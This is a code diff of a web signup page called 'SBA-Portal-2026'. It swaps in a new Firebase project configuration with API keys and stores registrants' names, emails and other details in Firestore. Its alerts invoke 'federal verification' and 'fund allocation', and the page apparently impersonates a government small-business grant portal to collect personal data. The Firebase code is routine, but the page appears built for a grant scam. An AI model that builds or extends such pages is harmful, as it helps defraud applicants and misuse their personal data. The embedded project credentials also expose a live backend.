@@ -74,13 +74,14 @@
         import { getAuth, createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        // Confirmed Project Config for SBA-Portal-2026
         const firebaseConfig = {
-            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
-            authDomain: "sba-grant-2026.firebaseapp.com",
-            projectId: "sba-grant-2026",
-            storageBucket: "sba-grant-2026.firebasestorage.app",
-            messagingSenderId: "838430821326",
-            appId: "1:838430821326:web:6438deacb334076a64f99f"
+            apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
+            authDomain: "sba-portal-2026-f1253.firebaseapp.com",
+            projectId: "sba-portal-2026-f1253",
+            storageBucket: "sba-portal-2026-f1253.firebasestorage.app",
+            messagingSenderId: "363290267220",
+            appId: "1:363290267220:web:2a3e8601c11be5dd6e27c1"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -93,7 +94,6 @@
             const pass = document.getElementById('pass').value;
             const agree = document.getElementById('terms').checked;
 
-            // Basic Validation
             if(!name || !email || !pass) return alert("NOTICE: Complete all fields for federal verification.");
             if(!agree) return alert("NOTICE: You must certify the accuracy of your information to proceed.");
             if(pass.length < 6) return alert("SECURITY: Password must be at least 6 characters.");
@@ -103,14 +103,11 @@
             btn.disabled = true;
 
             try {
-                // 1. Create User
                 const res = await createUserWithEmailAndPassword(auth, email, pass);
                 const user = res.user;
 
-                // 2. Send Verification Email
                 await sendEmailVerification(user);
 
-                // 3. Save to Firestore
                 await setDoc(doc(db, "users", user.uid), {
                     fullName: name,
                     email: email,
@@ -120,7 +117,6 @@
                     regDate: serverTimestamp()
                 });
 
-                // 4. Redirect to Verify Page
                 alert("PROFILE SECURED.\n\nA verification link has been sent to " + email + ".\nYou must confirm your email to authorize the fund allocation.");
                 window.location.href = 'verify.html';
 
@@ -137,4 +133,4 @@
         };
     </script>
 </body>
-</htm>
+</html>
